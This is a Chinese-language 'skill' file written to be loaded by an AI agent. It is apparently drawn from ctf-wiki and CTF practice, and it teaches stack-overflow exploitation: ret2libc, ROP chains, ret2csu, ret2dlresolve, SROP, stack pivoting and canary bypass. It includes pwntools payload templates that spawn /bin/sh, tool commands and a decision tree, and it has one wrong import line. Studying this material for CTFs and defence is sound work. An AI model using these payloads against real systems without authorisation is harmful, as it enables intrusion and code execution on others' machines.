# 技能：Stack Overflow & ROP — 专家级攻击手册

> **AI 加载指令**：专家级栈溢出利用技术。涵盖经典缓冲区溢出、返回到libc、ROP链构建、ret2csu、ret2dlresolve、SROP、栈旋转和canary绕过。源自ctf-wiki高级ROP、真实世界的CVE和CTF竞赛模式。基础模型往往无法理解在约束条件下选择gadget的微妙之处。

## 0. 相关路由

- [格式化字符串利用](../format-string-exploitation/SKILL.md) — 在触发溢出前通过格式化字符串泄露canary/libc/PIE基址
- [二进制保护绕过](../binary-protection-bypass/SKILL.md) — 系统性绕过NX、ASLR、PIE、canary、RELRO
- [任意写至RCE](../arbitrary-write-to-rce/SKILL.md) — 将写原语（GOT、钩子、vtable）转换为代码执行
- [堆利用](../heap-exploitation/SKILL.md) — 当漏洞位于堆而非栈时

### 高级参考

加载[ROP_ADVANCED_TECHNIQUES.md](./ROP_ADVANCED_TECHNIQUES.md)当你需要：
- 盲目ROP (BROP) 方法针对无二进制的远程服务
- 32位系统上的ASLR绕过ret2vdso
- PIE绕过的部分覆盖技术
- JOP / COP替代代码重用范式

---

## 1. 栈布局基础

```
高地址
┌─────────────────────┐
│   ...  (调用者)     │
├─────────────────────┤
│   返回地址          │  ← 覆盖目标 (EIP/RIP控制)
├─────────────────────┤
│   保存的EBP/RBP     │  ← 覆盖用于栈旋转
├─────────────────────┤
│   Canary (如果启用) │
├─────────────────────┤
│   局部变量          │  ← 缓冲区从此处开始
├─────────────────────┤
│   ...               │
└─────────────────────┘
低地址
```

| 元素 | x86 (32位) | x86-64 (64位) |
|---|---|---|
| 返回地址大小 | 4字节 | 8字节 |
| 保存的帧指针 | 4字节 (EBP) | 8字节 (RBP) |
| Canary大小 | 4字节 | 8字节 |
| 调用约定 | 参数在栈上 | RDI, RSI, RDX, RCX, R8, R9然后栈 |
| 系调用指令 | `int 0x80` | `syscall` |

---

## 2. 返回到libc

当NX启用（栈不可执行）时，将执行重定向到libc函数。

### 经典32位ret2libc

```python
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)      # 假设的返回地址用于system()
payload += p32(binsh_addr)     # 参数1: "/bin/sh"
```

### 64位ret2libc — 需要gadget用于参数

```python
pop_rdi = elf_base + 0x401234  # pop rdi; ret
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

### Libc基址泄露方法

| 方法 | 技术 | 条件 |
|---|---|---|
| puts@plt(puts@GOT) | 泄露解析的libc地址 | GOT已解析，puts在PLT中 |
| write@plt(1, read@GOT, 8) | 通过write系统调用泄露 | write可用 |
| printf("%s", GOT_entry) | 通过格式化字符串泄露 | printf可控 |
| 部分覆盖 | 覆盖返回的低字节以到达泄露gadget | PIE启用，已知最后12位 |

```python
# 典型泄露模式
rop = b'A' * offset
rop += p64(pop_rdi) + p64(elf.got['puts'])
rop += p64(elf.plt['puts'])
rop += p64(main_addr)  # 返回到main以进行第二个payload

io.sendline(rop)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
```

### one_gadget — 单gadget RCE

```bash
$ one_gadget /path/to/libc.so.6
0x4f3d5  execve("/bin/sh", rsp+0x40, environ)
  约束条件: rsp & 0xf == 0, rcx == NULL
0x4f432  execve("/bin/sh", rsp+0x40, environ)
  约束条件: [rsp+0x40] == NULL
```

约束条件必须满足 — 在使用前检查寄存器/栈状态。

---

## 3. ROP链构建

### 工具比较

| 工具 | 优势 | 命令 |
|---|---|---|
| ROPgadget | 全面搜索，链生成 | `ROPgadget --binary elf --ropchain` |
| ropper | 语义搜索，JOP/COP支持 | `ropper -f elf --search "pop rdi"` |
| pwntools ROP | 自动链构建 | `rop = ROP(elf); rop.call('system', ['/bin/sh'])` |
| xrop | 快速gadget搜索 | `xrop -r elf` |

### 基本gadget模式

| 目的 | Gadget | 用例 |
|---|---|---|
| 设置RDI (参数1) | `pop rdi; ret` | 大多数函数调用 |
| 设置RSI (参数2) | `pop rsi; pop r15; ret` | 双参数函数 |
| 设置RDX (参数3) | `pop rdx; ret` (罕见) | 三参数函数，使用ret2csu |
| 系调用 | `syscall; ret` | 直接系调用入 |
| 栈旋转 | `leave; ret` | 将RSP移动到受控缓冲区 |
| 对齐栈 | `ret` (单个ret gadget) | 修正16字节对齐以用于movaps |

**x86-64栈对齐**：`system()`和其他libc函数使用`movaps`，需要RSP % 16 == 0。如果对齐错误，在调用前插入一个额外的`ret` gadget。

---

## 4. ret2csu — 通用3参数控制

`__libc_csu_init`存在于几乎所有动态链接的ELF二进制文件中，并提供最多3个参数的受控调用。

```nasm
; Gadget 1 (csu_init + 0x3a): 弹出寄存器
pop rbx     ; 0
pop rbp     ; 1
pop r12     ; 调用目标 (函数指针地址)
pop r13     ; 参数3 (rdx)
pop r14     ; 参数2 (rsi)
pop r15     ; 参数1 (edi = r15d)
ret

; Gadget 2 (csu_init + 0x20): 受控调用
mov rdx, r13
mov rsi, r14
mov edi, r15d    ; 注意：仅设置edi (32位)，不设置完整rdi
call [r12 + rbx*8]
add rbx, 1
cmp rbp, rbx
jne <loop>
; 跳转回gadget 1
```

**关键约束**：r12必须指向目标函数的**指针**（例如GOT条目），而不是函数地址直接。设置`rbx=0`，`rbp=1`以跳过循环。

---

## 5. ret2dlresolve

伪造ELF动态链接结构以解析任意函数（例如`system`）而无需libc泄露。

### 攻击流程

1. 控制执行以调用`_dl_runtime_resolve(link_map, reloc_offset)`
2. 在已知可写地址伪造`Elf_Rel`
3. 伪造`Elf_Sym`，`st_name`指向伪造的字符串`"system\x00"`
4. 设置`reloc_offset`使解析器使用伪造结构
5. 参数（`/bin/sh`）放在栈上或已知缓冲区

```python
# pwntools自动化（推荐）
from pwntools import *
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
io.sendline(rop.chain())
io.sendline(dlresolve.payload)
```

### 32位与64位差异

| 方面 | 32位 | 64位 |
|---|---|---|
| 重定位类型 | `Elf32_Rel` (8字节) | `Elf64_Rela` (24字节) |
| 符号表条目 | `Elf32_Sym` (16字节) | `Elf64_Sym` (24字节) |
| 对齐 | 松散 | 严格 (必须满足`ndx = (reloc_offset) / sizeof(Elf64_Rela)`，然后`sym = symtab[ndx]`) |
| 版本检查 | 通常可跳过 | `VERSYM[sym_index]`必须有效或0 |

---

## 6. SROP — Sigreturn导向编程

滥用`sigreturn`系统调用从栈上的伪造信号帧一次性设置所有寄存器。

```python
from pwn import *
frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret_addr
frame.rsp = new_stack_addr  # 可选旋转

payload = b'A' * offset
payload += p64(pop_rax_ret) + p64(15)  # SYS_rt_sigreturn = 15
payload += p64(syscall_ret)
payload += bytes(frame)
```

**何时使用**：有限gadget，无`pop rdx`，静态二进制，或需要旋转栈到任意地址。

---

## 7. 栈旋转

当溢出长度受限时，将栈指针移动到攻击者控制的缓冲区。

| 技术 | Gadget | 预条件 |
|---|---|---|
| `leave; ret` | `mov rsp, rbp; pop rbp; ret` | 控制保存的RBP指向伪造栈 |
| `xchg rsp, rax; ret` | 交换RSP与RAX | 通过gadget链控制RAX |
| `pop rsp; ret` | 直接RSP控制 | 罕见但强大 |
| SROP旋转 | 在SigreturnFrame中设置RSP | 仅需sigreturn gadget |

### leave;ret旋转模式

```
溢出: [AAAA...][fake_rbp → buf][leave_ret_addr]
  1st leave: rsp = rbp → fake_rbp; pop rbp → *fake_rbp
  1st ret:   rip = leave_ret_addr
  2nd leave: rsp = new_rbp → buf+8; pop rbp → *(buf)
  2nd ret:   rip = *(buf+8) → buf中ROP链的起始
```

---

## 8. Canary绕过

| 技术 | 条件 | 方法 |
|---|---|---|
| 暴力破解 | `fork()`服务器（子进程canary相同） | 字节逐个 (64位为256 × 7 = 1792次尝试) |
| 格式化字符串泄露 | 可用`printf(user_input)` | `%N$p`从栈读取canary |
| 栈读取 | 单字节溢出或部分读取 | 覆盖canary空字节，通过错误/输出读取 |
| 线程canary | 溢出达到TLS | 同时覆盖TLS中的`stack_guard` (`fs:[0x28]`) |
| 信息泄露 | 未初始化栈变量泄露 | Canary包含在泄露数据中 |

---

## 9. 工具快速参考

```bash
checksec ./binary                          # 显示保护 (NX, canary, PIE, RELRO)
ROPgadget --binary ./binary --ropchain     # 自动生成ROP链
ropper -f ./binary --search "pop rdi"      # 语义gadget搜索
one_gadget ./libc.so.6                     # 查找一次性RCE gadgets
pwn template ./binary --host x --port y    # 生成pwntools利用骨架
```

---

## 10. 决策树

```
二进制存在栈溢出？
├── checksec: NX禁用？
│   └── 是 → 栈上shellcode，返回到缓冲区 (ret2shellcode)
│   └── 否 (NX启用) →
│       ├── Canary启用？
│       │   ├── 是 → fork()服务器？ → 暴力破解canary
│       │   │         格式化字符串？ → 泄露canary
│       │   │         信息泄露？     → 读取canary
│       │   └── 否 → 继续ROP
│       ├── ASLR/PIE启用？
│       │   ├── PIE → 泄露代码基址 (部分覆盖最后12位，或信息泄露)
│       │   ├── 仅ASLR → 泄露libc基址 (puts@GOT, write@GOT)
│       │   └── 既不启用 → 地址已知，直接ROP
│       ├── 能否泄露libc？
│       │   ├── 是 → ret2libc (system/execve) 或 one_gadget
│       │   └── 否 → ret2dlresolve (伪造解析) 或 SROP
│       ├── 需要3+参数但无pop rdx？
│       │   └── ret2csu或SROP
│       ├── 溢出太短无法完整链？
│       │   └── 栈旋转 (leave;ret, xchg rsp)
│       ├── 静态二进制（无libc）？
│       │   └── SROP + 系调用链 (通过sigreturn执行execve)
│       └── 完全RELRO？
│           └── 无法覆盖GOT → 目标__free_hook, __malloc_hook,
│               或_IO_FILE vtable (见../arbitrary-write-to-rce/)
```
